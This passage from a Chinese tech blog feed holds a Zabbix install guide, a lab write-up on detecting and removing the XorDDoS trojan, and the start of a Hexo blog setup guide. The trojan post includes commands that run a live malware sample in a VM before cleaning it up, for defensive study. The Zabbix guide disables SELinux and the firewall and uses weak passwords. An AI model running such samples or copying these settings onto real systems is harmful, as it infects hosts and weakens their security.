href="https://www.cnblogs.com/me80/p/7218883.html" target="_blank" rel="noopener">https://www.cnblogs.com/me80/p/7218883.html</a> </strong></p><p><strong>2、GCC环境安装</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install gcc gcc-c++ autoconf automake zlib zlib-devel openssl openssl-devel pcre pcre-devel -y</span><br></pre></td></tr></table></figure></p><p><strong>3、selinux和防火墙处理</strong><br>进入seliunx配置文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vim  /etc/selinux/config SELINUX=disabled  #重启才生效</span><br><span class="line">selinux：setenforce 0  #临时关闭</span><br><span class="line">systemctl stop firewalld.service   #关闭防火墙</span><br></pre></td></tr></table></figure></p><h3 id="0x03-【安装步骤】"><a href="#0x03-【安装步骤】" class="headerlink" title="0x03 【安装步骤】"></a>0x03 【安装步骤】</h3><h4 id="一、安装zabbix"><a href="#一、安装zabbix" class="headerlink" title="一、安装zabbix"></a>一、安装zabbix</h4><p><strong>1、在官网下载zabbix安装包，<a href="https://www.zabbix.com/download" target="_blank" rel="noopener">https://www.zabbix.com/download</a></strong><br><strong>2、解压软件包并安装依赖包</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /usr/local/src  </span><br><span class="line">tar -zxvf zabbix-3.4.12.tar.gz  </span><br><span class="line">yum -y install net-snmp-devel libxml2-devel libcurl-deve libevent libevent-devel libcurl</span><br></pre></td></tr></table></figure></p><p><strong>3、编译安装zabbix</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd zabbix-3.4.3/       #切换进入zabbix目录  </span><br><span class="line">./configure --prefix=/data/server/zabbix --enable-server --enable-agent --with-mysql --enable-ipv6 --with-net-snmp --with-libcurl --with-libxml2         #编译zabbix  </span><br><span class="line">make&amp;&amp;make install     #安装zabbix,此步骤有点长，请耐心等待。</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-36.png" alt="upload successful"></p><h4 id="二、配置zabbix"><a href="#二、配置zabbix" class="headerlink" title="二、配置zabbix"></a>二、配置zabbix</h4><p><strong>1、创建用户账户</strong><br>对于所有Zabbix的守护进程，需要一个无特权的用户。如果Zabbix守护进程以一个无特权的用户账户启动，那么它会使用该用户运行。<br>然而，如果一个守护进程以‘root’用户启动，它会切换为‘zabbix’用户账户，且这个用户必须存在。在Linux系统中，可以使用下面命令建立一个用户（该用户属于自己的用户组，“zabbix”）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">groupadd zabbix</span><br><span class="line">useradd -g zabbix zabbix</span><br></pre></td></tr></table></figure></p><p><strong>2、数据库导入zabbix template<br>使用数据库用户zabbix登录数据库</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql –uzabbix –p</span><br><span class="line">use zabbix;    #切换到zabbix库</span><br><span class="line">#导入zabbix默认表</span><br><span class="line">source /usr/local/src/zabbix-3.4.12/database/mysql/schema.sql;  </span><br><span class="line">source/usr/local/src/zabbix-3.4.12/database/mysql/images.sql;</span><br><span class="line">source /usr/local/src/zabbix-3.4.12/database/mysql/data.sql;</span><br></pre></td></tr></table></figure></p><p><strong>3、创建zabbix用户和日志目录并给予权限</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">useradd -s /sbin/nologin zabbix   #创建用户</span><br><span class="line">mkdir /usr/local/zabbix/logs    #创建目录</span><br><span class="line">chown -R zabbix:zabbix /usr/local/zabbix  #给予权限</span><br></pre></td></tr></table></figure></p><p><strong>4、配置zabbix的服务端（server）</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">vim /data/server/zabbix/etc/zabbix_server.conf </span><br><span class="line">&gt;</span><br><span class="line">LogFile=/data/server/zabbix/logs/zabbix_server.log</span><br><span class="line">PidFile=/data/server/zabbix/zabbix_server.pid</span><br><span class="line">DBHost=localhost</span><br><span class="line">DBName=zabbix</span><br><span class="line">DBUser=zabbix</span><br><span class="line">DBPassword=123456</span><br><span class="line">DBSocket=/data/server/mysql/mysql.sock</span><br><span class="line">Timeout=4</span><br><span class="line">LogSlowQueries=3000</span><br><span class="line">Include=/data/server/zabbix/etc/zabbix_server.conf.d/*.conf</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-37.png" alt="upload successful"><br><strong>5、配置zabbix客户端（agent）</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vim /data/server/zabbix/etc/zabbix_agentd.conf</span><br><span class="line">&gt;</span><br><span class="line">PidFile=/data/server/zabbix/zabbix_agentd.pid</span><br><span class="line">LogFile=/data/server/zabbix/logs/zabbix_agentd.log</span><br><span class="line">Server=127.0.0.1</span><br><span class="line">ListenPort=10050</span><br><span class="line">ServerActive=127.0.0.1</span><br><span class="line">Hostname=Zabbix server</span><br><span class="line">Include=/data/server/zabbix/etc/zabbix_agentd.conf.d/*.conf</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-38.png" alt="upload successful"><br><strong>6、配置PHP相应的文件</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/php.ini</span><br><span class="line">&gt;</span><br><span class="line">php_value max_execution_time 300</span><br><span class="line">php_value memory_limit 128M</span><br><span class="line">php_value post_max_size 16M</span><br><span class="line">php_value upload_max_filesize 2M</span><br><span class="line">php_value max_input_time 300</span><br><span class="line">php_value always_populate_raw_post_data -1</span><br><span class="line">date.timezone = Asia/Shanghai</span><br></pre></td></tr></table></figure></p><p><strong>7、安装zabbix web界面</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mkdir /var/www/html/zabbix</span><br><span class="line">cd /usr/local/src/zabbix-3.4.0/frontends/php </span><br><span class="line">cp -a . /var/www/html/zabbix</span><br></pre></td></tr></table></figure></p><p><strong>8、启动zabbix服务</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">systemctl start httpd    #启动apache服务</span><br><span class="line">/data/server/mysql/support-files/mysql.server start      #启动数据库服务</span><br><span class="line">/data/server/zabbix/sbin/zabbix_server       #启动zabbix服务端服务</span><br><span class="line">/data/server/zabbix/sbin/zabbix_agentd  #在所有的被监控机器上启动zabbix_agentd</span><br></pre></td></tr></table></figure></p><h4 id="三、配置zabbix前端"><a href="#三、配置zabbix前端" class="headerlink" title="三、配置zabbix前端"></a>三、配置zabbix前端</h4><p><strong>1、在你的浏览器中，打开Zabbix URL： http://&lt;服务器IP或主机名&gt;/zabbix<br><a href="http://192.168.199.206/zabbix/setup.php" target="_blank" rel="noopener">http://192.168.199.206/zabbix/setup.php</a><br>你可以看到前端安装向导的第一个页面。</strong></p><p><img src="/images/pasted-39.png" alt="upload successful"></p><p><strong>2、确认满足所有的软件安装前置条件,如果下图这些显示Failed，那么我们编辑/etc/php.ini，将下图中的配置项都改成要求的大小，未配置的项进行手动添加</strong><br>vim /etc/php.ini</p><p><img src="/images/pasted-40.png" alt="upload successful"></p><p>如果出现PHP xmlwiter，PHP smlreader off 那么请键入下条命令<br>yum install php-bcmath php-mbstring php-xmlwriter php-xmlreader<br>PHP LDAP Warning 不用管，直接下一步</p><p><img src="/images/pasted-41.png" alt="upload successful"><br><strong>3、输入连接数据库的详细信息。Zabbix数据库必须是已经创建好的。</strong></p><p><img src="/images/pasted-42.png" alt="upload successful"><br><strong>4、输入Zabbix Server的详细信息。</strong></p><p><img src="/images/pasted-43.png" alt="upload successful"><br><strong>5、检查设置信息。</strong></p><p><img src="/images/pasted-44.png" alt="upload successful"><br><strong>6、下载配置文件，将它放置在Web服务器HTML文档子目录（即你复制Zabbix PHP文件的目录）的conf/路径下。</strong><br>cd /var/www/html/zabbix/conf<br>rz<br>使用rz命令上传就可以了</p><p><img src="/images/pasted-45.png" alt="upload successful"></p><p><img src="/images/pasted-46.png" alt="upload successful"></p><p><strong>7、上传完毕后，完成安装。</strong></p><p><img src="/images/pasted-47.png" alt="upload successful"><br><strong>8、Zabbix前端已经就绪！默认的用户名是Admin，密码是zabbix。</strong></p><p><img src="/images/pasted-48.png" alt="upload successful"></p><p><strong>登录后显示界面：</strong></p><p><img src="/images/pasted-49.png" alt="upload successful"></p><p><strong>使用说明参考文档：<a href="https://www.zabbix.com/documentation/3.4/manual/quickstart/login" target="_blank" rel="noopener">https://www.zabbix.com/documentation/3.4/manual/quickstart/login</a></strong></p><h3 id="0x04-【参考文献】"><a href="#0x04-【参考文献】" class="headerlink" title="0x04 【参考文献】"></a>0x04 【参考文献】</h3><p><a href="https://www.zabbix.com/download?zabbix=3.4&amp;os_distribution=centos&amp;os_version=7&amp;db=MySQL" target="_blank" rel="noopener">https://www.zabbix.com/download?zabbix=3.4&amp;os_distribution=centos&amp;os_version=7&amp;db=MySQL</a><br><a href="https://www.cnblogs.com/kowloon/p/7771495.html" target="_blank" rel="noopener">https://www.cnblogs.com/kowloon/p/7771495.html</a><br><a href="http://blog.51cto.com/xpu2001/2052634" target="_blank" rel="noopener">http://blog.51cto.com/xpu2001/2052634</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;【前言】&quot;&gt;&lt;a href=&quot;#【前言】&quot; class=&quot;headerlink&quot; title=&quot;【前言】&quot;&gt;&lt;/a&gt;【前言】&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;zabbix（音同 za:bix）是一个基于WEB界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。zabbix能监视各种网络参数，保证服务器系统的安全运营；并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。zabbix由2部分构成，zabbix server与可选组件zabbix agent。zabbix server可以通过SNMP，zabbix agent，ping，端口监视等方法提供对远程服务器/网络状态的监视，数据收集等功能，它可以运行在Linux，Solaris，HP-UX，AIX，Free BSD，Open BSD，OS X等平台上。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="安全运维" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8%E8%BF%90%E7%BB%B4/"/>
    
    
      <category term="zabbix" scheme="http://yoursite.com/tags/zabbix/"/>
    
      <category term="监控" scheme="http://yoursite.com/tags/%E7%9B%91%E6%8E%A7/"/>
    
  </entry>
  
  <entry>
    <title>记一次XorDDos木马的清除</title>
    <link href="http://yoursite.com/2018/08/10/%E8%AE%B0%E4%B8%80%E6%AC%A1XorDDos%E6%9C%A8%E9%A9%AC%E7%9A%84%E6%B8%85%E9%99%A4/"/>
    <id>http://yoursite.com/2018/08/10/记一次XorDDos木马的清除/</id>
    <published>2018-08-10T10:00:00.000Z</published>
    <updated>2018-08-10T11:52:14.466Z</updated>
    
    <content type="html"><![CDATA[<h3 id="【前言】"><a href="#【前言】" class="headerlink" title="【前言】"></a>【前言】</h3><blockquote><p>一种名为“XOR.DDoS”的新型木马出现，该木马能够感染32位和64位的Linux系统，通过安装rootkit来隐藏自身，并可通过DDoS攻击形成僵尸网络。XOR.DDoS木马原理是杀毒软件公司Avast在它们的博客中解释了这种新的威胁，该木马可以根据目标Linux系统环境的不同来相应调整安装方式，并安装一个rootkit来躲避杀毒软件的检测。黑客首先通过SSH暴力登录目标Linux系统，然后尝试获得根用户证书。如果成功，则通过一个shell脚本安装该木马，该shell脚本的功能主要包括：主程序、环境检测、编译、解压、安装等。该木马首先通过受害系统的内核头文件来进行兼容性检测，如果成功匹配则继续安装一个rootkit，以此来隐藏木马自身。</p></blockquote><a id="more"></a><h3 id="0x01-【实现环境】"><a href="#0x01-【实现环境】" class="headerlink" title="0x01 【实现环境】"></a>0x01 【实现环境】</h3><p>CentOS Linux release 7.5.1804 (Core)</p><p><strong>在植入木马之前一定要记得把虚拟机的网络设置成NAT或host-only模式防止病毒传播到本机或造成破坏！</strong></p><h3 id="0x02-【植入木马】"><a href="#0x02-【植入木马】" class="headerlink" title="0x02 【植入木马】"></a>0x02 【植入木马】</h3><p>把XorDDos的病毒样本上传到liunx机器中，进行解压，运行木马文件，执行完之后发现木马自毁了文件，可知是一个并不一般的木马。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">unzip XorDDos样本-密码123.zip </span><br><span class="line">chmod +x a753cb1ff86c742bb497155362664c3b </span><br><span class="line">./a753cb1ff86c742bb497155362664c3b </span><br><span class="line">sh b3c466263551794bb247c68ff1bc357a.sh </span><br><span class="line">./b3c466263551794bb247c68ff1bc357a</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-19.png" alt="upload successful"></p><h3 id="0x03-【杀马全过程】"><a href="#0x03-【杀马全过程】" class="headerlink" title="0x03 【杀马全过程】"></a>0x03 【杀马全过程】</h3><p>1.发现cpu使用超高、网络流量异常、服务器还会出现卡顿现象。<br>通过top发现会有几个可疑的程序占用了CPU。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">top</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-20.png" alt="upload successful"></p><p>2.执行tcpdump -i ens33后发现网络的流量异常，不断在往外发送请求。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcpdump -i ens33</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-21.png" alt="upload successful"><br>3.通过lsof -i 看到了一个可疑的服务，PID为1657。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -i</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-34.png" alt="upload successful"><br>4.尝试着杀掉这个进程 kill -9 1657，发现又起了另一个服务进程，猜测这个木马会不断的改名自启。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -9 1657</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-22.png" alt="upload successful"><br><strong>查杀思路：<br>由于运行进程有多个相互保护（参考一下pstree），而且和病毒文件直接也是相互配合，如果直接删除也会重新生成一个新的病毒文件，所以查杀的基本的思路是：删除定时任务中的病毒启动—&gt;破坏病毒文件使其不可执行（不要删除，否会自动生成）—&gt;停止系统病毒进程—&gt;删除病毒文件—&gt;清理感染文件—&gt;关闭病毒开机启动<br>以下查杀可以自由组合，按上面查杀思路排列即可！</strong></p><p>5.查看木马进程的位置。(proc之后跟的数字文件就是程序的PID)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ll /proc/9257</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-23.png" alt="upload successful"><br>我们还可以尝试使用rkhunter或chkrootkit工具看看有哪些文件被木马篡改过。步骤略。</p><p>6.查看计划任务，没有发现任何任务，可是其他同学会发现，从而可以定位木马的目录在/etc/cron.hourly/<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -l   #查看计划任务</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-25.png" alt="upload successful"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ll /etc/cron.hourly/   #发现了木马的执行文件位置</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-26.png" alt="upload successful"></p><p>7.先对木马文件去权 chmod 000 uzsziblfy.sh ，然后查看里面的文件信息。也可以尝试将木马执行文件下载下来进行反编译，不过一定要先对其去权。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/cron.hourly/ccyfuny.sh</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-27.png" alt="upload successful"><br>对其文件去权chmod 000 /usr/bin/ccyfuny</p><p>8.利用ll -aR /etc/rc.d查看木马文件的连接，红色一直在闪烁的是之前删除了的木马。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ll -aR /etc/rc.d</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-28.png" alt="upload successful"><br>对其去权 chmod 000 /etc/init.d/ccyfuny</p><p>9.reboot重启系统,然后查看CPU和开放端口以及进程情况。<br>查看top没有发现可疑程序。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">top</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-29.png" alt="upload successful"><br>也没发现可疑的进程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -i</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-30.png" alt="upload successful"><br>也没发现可疑的端口开放<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -anlpt</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-31.png" alt="upload successful"></p><p>10.所有文件去完权后，接着清除所有的可疑文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rm -rf /usr/bin/ccyfuny ccyfuny.sh</span><br><span class="line">rm -rf /etc/cron.hourly/ccyfuny.sh </span><br><span class="line">rm -rf /etc/init.d/ccyfuny</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-32.png" alt="upload successful"><br>11.再reboot重启系统，并没有发现可疑文件了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netstat -anlpt</span><br><span class="line">lsof -i</span><br></pre></td></tr></table></figure></p><p><img src="/images/pasted-33.png" alt="upload successful"></p><p><strong>总结，先去除所有可疑执行文件的执行权限，然后重启，再删除所有可疑文件，再重启，就大功告成了。</strong></p><h3 id="0x04-【参考文件】"><a href="#0x04-【参考文件】" class="headerlink" title="0x04 【参考文件】"></a>0x04 【参考文件】</h3><p><a href="https://blog.csdn.net/gosenkle/article/details/80220788" target="_blank" rel="noopener">https://blog.csdn.net/gosenkle/article/details/80220788</a><br><a href="https://blog.csdn.net/rigous/article/details/73970391" target="_blank" rel="noopener">https://blog.csdn.net/rigous/article/details/73970391</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;【前言】&quot;&gt;&lt;a href=&quot;#【前言】&quot; class=&quot;headerlink&quot; title=&quot;【前言】&quot;&gt;&lt;/a&gt;【前言】&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;一种名为“XOR.DDoS”的新型木马出现，该木马能够感染32位和64位的Linux系统，通过安装rootkit来隐藏自身，并可通过DDoS攻击形成僵尸网络。XOR.DDoS木马原理是杀毒软件公司Avast在它们的博客中解释了这种新的威胁，该木马可以根据目标Linux系统环境的不同来相应调整安装方式，并安装一个rootkit来躲避杀毒软件的检测。黑客首先通过SSH暴力登录目标Linux系统，然后尝试获得根用户证书。如果成功，则通过一个shell脚本安装该木马，该shell脚本的功能主要包括：主程序、环境检测、编译、解压、安装等。该木马首先通过受害系统的内核头文件来进行兼容性检测，如果成功匹配则继续安装一个rootkit，以此来隐藏木马自身。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="木马查杀" scheme="http://yoursite.com/categories/%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80/"/>
    
    
      <category term="木马查杀" scheme="http://yoursite.com/tags/%E6%9C%A8%E9%A9%AC%E6%9F%A5%E6%9D%80/"/>
    
  </entry>
  
  <entry>
    <title>Hexo-GitHub搭建静态博客平台(Next主题)</title>
    <link href="http://yoursite.com/2018/08/09/Hexo-GitHub%E6%90%AD%E5%BB%BA%E9%9D%99%E6%80%81%E5%8D%9A%E5%AE%A2%E5%B9%B3%E5%8F%B0-Next%E4%B8%BB%E9%A2%98/"/>
    <id>http://yoursite.com/2018/08/09/Hexo-GitHub搭建静态博客平台-Next主题/</id>
    <published>2018-08-09T13:23:00.000Z</published>
    <updated>2018-08-13T13:51:24.694Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>gitHub是一个面向<a href="https://baike.baidu.com/item/%E5%BC%80%E6%BA%90/20720669" target="_blank" rel="noopener">开源</a>及私有<a href="https://baike.baidu.com/item/%E8%BD%AF%E4%BB%B6/12053" target="_blank" rel="noopener">软件</a>项目的托管平台，因为只支持git 作为唯一的版本库格式进行托管，故名gitHub。 Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 <a href="http://daringfireball.net/projects/markdown/" target="_blank" rel="noopener">Markdown</a>（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。 </p></blockquote><a id="more"></a> <h3 id="0x01-准备工作"><a href="#0x01-准备工作" class="headerlink" title="0x01 准备工作"></a>0x01 准备工作</h3><h4 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h4><p>我的域名：<a href="http://www.dizai.tech，主要是提升自我逼格，不愿意花钱就跳过此步骤。" target="_blank" rel="noopener">www.dizai.tech，主要是提升自我逼格，不愿意花钱就跳过此步骤。</a><br>国内可以去阿里云或腾讯云购买域名，价格也很便宜。</p><h4 id="环境技术"><a href="#环境技术" class="headerlink" title="环境技术"></a>环境技术</h4><p>前往github官网<a href="https://github.com" target="_blank" rel="noopener">https://github.com</a> 注册一个github账号。<br> <a href="https://hexo.io/zh-cn/" target="_blank" rel="noopener">Hexo</a> 的安装前提就是得有 Node.js 和 Git 。</p><p> 这里，我们要区分清楚git与github。git是一个版本控制的工具，而github有点类似于远程仓库，用于存放用git管理的各种项目。<br> 下面提供相关的官方版本地址，安装教程去网上搜一下就很多。</p><ul><li><p>Node 官方版本安装：<a href="https://nodejs.org/en/" target="_blank" rel="noopener">https://nodejs.org/en/</a> </p></li><li><p>Git 官方版本安装：<a href="https://git-scm.com/download/win" target="_blank" rel="noopener">https://git-scm.com/download/win</a> </p></li><li><p>我用到软件版本（你们可以在官方下载最新版的）</p><p>Git：Git-2.18.0-64-bit </p><p>Node：node-v10.7.0-x64 </p><p>验证安装：任何位置鼠标右击出现Git Bash Here</p><p>cmd下</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git --version</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-0.png" alt="upload successful"></p><p>验证安装：cmd下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node -v</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-1.png" alt="upload successful"></p><h3 id="0x02-Github-配置"><a href="#0x02-Github-配置" class="headerlink" title="0x02 Github 配置"></a>0x02 Github 配置</h3><h4 id="创建仓库-new-repository"><a href="#创建仓库-new-repository" class="headerlink" title="创建仓库 new repository"></a>创建仓库 new repository</h4><p>在自己的GitHub账号下创建一个新的仓库，命名为username.github.io（username 是你的账号名)。</p><p>在这里，要知道，GitHub Pages有两种类型：User/Organization Pages 和 Project Pages，而我所使用的是User Pages。<br> 简单来说，User Pages 与 Project Pages的区别是：</p><ol><li>User Pages 是用来展示用户的，而 Project Pages 是用来展示项目的。</li><li>用于存放 User Pages 的仓库必须使用username.github.io的命名规则，而 Project Pages 则没有特殊的要求。</li><li>User Pages 将使用仓库的 master 分支，而 Project Pages 将使用 gh-pages 分支。</li><li>User Pages 通过 http(s):<a href="http://username.github.io" target="_blank" rel="noopener">//username.github.io</a> 进行访问，而 Projects Pages通过 http(s):<a href="http://username.github.io/projectname" target="_blank" rel="noopener">//username.github.io/projectname</a> 进行访问。</li></ol><p>另外注意：</p><ul><li>注册的邮箱一定要验证，否则不会成功；</li><li>仓库名字必须是：username.github.io，其中username是你的用户名；</li><li>仓库创建成功不会立即生效，需要过一段时间，大概10-30分钟，或者更久，我的等了半个小时才生效；<br><img src="/images/pasted-2.png" alt="upload successful"></li></ul><h3 id="0x03-配置SSH-key"><a href="#0x03-配置SSH-key" class="headerlink" title="0x03 配置SSH key"></a>0x03 配置SSH key</h3><p><strong>用于本地与github数据交换生成并配置key</strong><br>执行如下命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;liuxianan&quot;#你的github用户名</span><br><span class="line">git config --global user.email  &quot;xxx@qq.com&quot;#填写你的github注册邮箱</span><br></pre></td></tr></table></figure></p><p>生成ssh密钥<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/. ssh#检查本机已存在的ssh密钥</span><br><span class="line">ssh-keygen -t rsa -C &quot;邮件地址&quot;#生成密钥</span><br></pre></td></tr></table></figure></p><p>连续按回车三次（使用默认ssh密钥生成策略），密钥生成成功，存于本地用户目录(~)，打开.ssh\id_rsa.pub文件，并复制其中内容</p><p>打开你的github主页，进入个人设置-&gt; SSH and GPG keys -&gt; New SSH key：</p><p>title任意填写，将内容复制到key中即可</p><p><strong>测试ssh</strong><br>本地执行</p><p>ssh -T <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a>         #注意邮箱地址不用改<br>如果提示Are you sure you want to continue connecting (yes/no)?，输入yes，然后会看到：</p><p>Hi xxx! You’ve successfully authenticated, but GitHub does not provide shell access.</p><p>看到这个信息说明SSH已配置成功！</p><h3 id="0x04-安装hexo"><a href="#0x04-安装hexo" class="headerlink" title="0x04 安装hexo"></a>0x04 安装hexo</h3><p><strong>以下命令都是在git命令行中实现</strong></p><p>首先在本地磁盘中建立一个Hexo文件夹用于存储本地文件(做本地文件保存以及测试使用)<br><img src="/images/pasted-3.png" alt="upload successful"><br>然后在文件夹中右击打开git命令框(我第一次直接在桌面右击，所以命令行无效果) </p><p><img src="/images/pasted-4.png" alt="upload successful"></p><p>在git命令框中安装Hexo</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install -g hexo</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-5.png" alt="upload successful"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init</span><br></pre></td></tr></table></figure><p><img src="/images/pasted-6.png" alt="upload successful"><br> 此目录会自动生成hexo相关文件</p><p> 注：此处目录中会存在一个_config.yml的文件，为hexo的主配置文件，以后我们称其为站点配置文件。<br><img src="/images/pasted-7.png" alt="upload successful"></p><h4 id="本地预览"><a href="#本地预览" class="headerlink" title="本地预览"></a>本地预览</h4><p> hexo目录中执行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo clean  #清除缓存</span><br><span class="line">hexo g#生成静态页面</span><br><span class="line">hexo s#启动本地预览服务</span><br></pre></td></tr></table></figure></p><p> 执行命令后，hexo会在public文件夹生成相关html文件，用于本地预览与后期提交github</p><p> 浏览器访问[<a href="http://127.0.0.1:4000或localhost:4000，即可看到hexo默认生成页面hello,world]" target="_blank" rel="noopener">http://127.0.0.1:4000或localhost:4000，即可看到hexo默认生成页面hello,world]</a></p><p><img src="/images/pasted-8.png" alt="upload successful"></p><h3 id="0x05-写博客"><a href="#0x05-写博客" class="headerlink" title="0x05 写博客"></a>0x05 写博客</h3><p>进入hexo根目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new &apos;my-first-blog&apos;</span><br></pre></td></tr></table></figure><p>‘ ‘中为你本篇博客的名称，执行完成后，会自动在\hexo\source_posts\目录下生成.md文件，</p><p>只要打开这个文件就可以写博客了。（.md的文件必须用支持markdown的编辑器）</p><h3 id="0x06-上传到github"><a href="#0x06-上传到github" class="headerlink" title="0x06 上传到github"></a>0x06 上传到github</h3><h4 id="上传前的配置"><a href="#上传前的配置" class="headerlink" 